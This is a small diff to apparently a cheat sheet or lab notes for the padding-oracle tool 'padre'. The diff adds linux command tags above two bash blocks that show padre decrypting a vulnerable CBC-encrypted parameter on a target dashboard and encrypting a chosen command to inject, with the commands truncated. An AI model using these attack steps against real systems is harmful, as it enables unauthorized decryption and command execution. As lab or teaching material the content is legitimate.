@@ -6,6 +6,7 @@ Padding-oracle exploitation tool that can decrypt and encrypt vulnerable CBC-pro
 
 ### Decrypt a vulnerable parameter
 
+<!-- cmd: linux -->
 ```bash
 padre -cookie 'PHPSESSID=...; role=...' \
   -u "http://$TARGET:1337/dashboard.php?date=$" \
@@ -18,6 +19,7 @@ recovered the plaintext command `date +%Y`.
 
 ### Encrypt a chosen command
 
+<!-- cmd: linux -->
 ```bash
 padre -cookie 'PHPSESSID=...; role=...' \
   -u "http://$TARGET:1337/dashboard.php?date=$" \
